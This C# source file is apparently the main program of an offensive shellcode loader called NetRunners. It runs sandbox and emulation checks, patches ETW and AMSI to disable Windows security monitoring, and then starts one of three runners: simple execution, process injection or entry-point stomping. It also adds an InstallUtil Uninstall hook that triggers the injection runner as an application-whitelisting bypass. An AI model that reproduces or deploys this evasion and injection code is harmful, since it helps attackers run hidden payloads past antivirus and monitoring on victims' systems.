using System;
using static NetRunners.Heuristics.Heuristics;
using static NetRunners.Patchers.Patcher;

namespace NetRunners.Exe
{
    class Program
    {
        /// <summary>
        /// Entry point for this program, calls Heurisitic functions, and then parses through arguments to determine which runner to call.
        /// Retrieves Heuristic functions from Heuristics class and Runner functions from Runners class.
        /// Accepts one or no arguments at runtime. By default (no args specified), calls Runner function (Simple shellcode runner).
        /// </summary>
        /// <param name="-pi">Calls Process Injection Runner. Case Insensitive</param>
        /// <param name="-eps">Calls EntryPoint Stomping Runner. Case Insensitive</param>
        static void Main(string[] args)
        {
           
            // check args number
            if (args.Length > 1)
            {
                Console.WriteLine("Error: Only one argument is allowed max.");
                return;
            }
            // call heuristic functions
            if ((!Sleep()) || (!NonEmulated()) || (!PatchEtw()) || (!PatchAmsi()))
            {
                return;
            }

            // Determine the function call based on the argument provided, case insensitive
            string call = args.Length == 1 ? args[0] : string.Empty;
            switch (call.ToLower())
            {
                // process injection runner
                case "-pi":
                    Console.WriteLine("[+] Process Injection selected!");
                    Runners.PiRunner.Run();
                    break;
                // entrypoint stomping runner
                case "-eps":
                    Console.WriteLine("[+] EntryPoint Stomping selected!");
                    Runners.EpsRunner.Run();
                    break;
                // simple runner
                default:
                    Console.WriteLine("[+] Shellcode Runner selected!");
                    Runners.Runner.Run();
                    break;
            }     
        }
    }
    /// <summary>
    /// Add InstallUtil support.
    /// </summary>
    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            // call heuristic functions
            if ((!Sleep()) || (!NonEmulated()) || (!PatchEtw()) || (!PatchAmsi()))
                return;

            Runners.EpsRunner.Run();
            //Runners.PiRunner.Run();
            //Runners.Runner.Run();

        }
    }
}
